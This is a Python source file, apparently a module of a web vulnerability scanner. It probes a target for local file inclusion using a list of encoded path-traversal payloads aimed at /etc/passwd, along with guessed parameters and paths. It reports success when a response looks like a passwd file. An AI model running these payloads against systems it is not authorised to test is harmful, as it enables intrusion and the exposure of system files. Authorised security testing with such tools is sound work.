import requests
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from config import HTTP_HEADERS, DEFAULT_TIMEOUT
from module.other import Other


class LFIScanner:
    def __init__(self, args):
        self.target = args.target
        self.threads = args.threads
        self.verbose = args.verbose
        self.payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%c0%af../etc/passwd",
            "..%c1%9c../etc/passwd",
            "..%e0%80%af../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "..%5c..%5c..%5cetc%5cpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
        ]
        self.common_params = ["file", "path", "page", "doc", "url", "template"]
        self.guess_paths = [
            "", "view", "include", "page", "show", "load", "download", "preview",
            "view.php", "include.php", "page.php", "show.php", "load.php",
            "index.php", "main.php"
        ]
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def extract_params_from_dom(self):
        found = set()
        for proto in ["http", "https"]:
            try:
                url = f"{proto}://{self.target}"
                r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
                soup = BeautifulSoup(r.text, "html.parser")
                for tag in soup.find_all(["a", "form", "script"]):
                    attr = tag.get("href") or tag.get("action") or tag.string or ""
                    found.update(re.findall(r"[?&]([a-zA-Z0-9_-]+)=", attr))
            except Exception as e:
                colored_module = self.printer.color_text(self.module_name, "cyan")
                colored_error = self.printer.color_text(str(e), "red")
                print(f"[!] [Module: {colored_module}] Failed extracting params from {url} - {colored_error}")
        return list(found.union(set(self.common_params)))

    def is_valid_passwd(self, text):
        if "root:x" in text and "nologin" in text:
            lines = text.split()
            return sum(1 for ln in lines if re.match(r"^[a-zA-Z0-9_-]+:x?:[0-9]+:[0-9]+:", ln)) >= 3
        return False

    def check_payload(self, url):
        try:
            r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
            if self.is_valid_passwd(r.text):
                return url
            if self.verbose:
                colored_module = self.printer.color_text(self.module_name, "cyan")
                colored_url = self.printer.color_text(url, "yellow")
                print(f"[-] [Module: {colored_module}] [Checked: {colored_url}]")
        except Exception as e:
            colored_module = self.printer.color_text(self.module_name, "cyan")
            colored_url = self.printer.color_text(url, "yellow")
            colored_error = self.printer.color_text(str(e), "red")
            print(f"[!] [Module: {colored_module}] [Error checking {colored_url} - {colored_error}]")
        return None

    def run(self):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        params = self.extract_params_from_dom()
        tasks = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for proto in ["http", "https"]:
                for path in self.guess_paths:
                    base = f"{proto}://{self.target}"
                    if path:
                        base += f"/{path}"
                    for param in params:
                        for payload in self.payloads:
                            full_url = f"{base}?{param}={payload}"
                            tasks.append(executor.submit(self.check_payload, full_url))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    colored_url = self.printer.color_text(result, "yellow")
                    print(f"[+] [Module: {colored_module}] [LFI Detected: {colored_url}]")
                    return [{"vulnerable": True, "payload": result}]

        print(f"[*] [Module: {colored_module}] No LFI detected.")
        return [{"vulnerable": False}]


def scan(args=None):
    return LFIScanner(args).run()
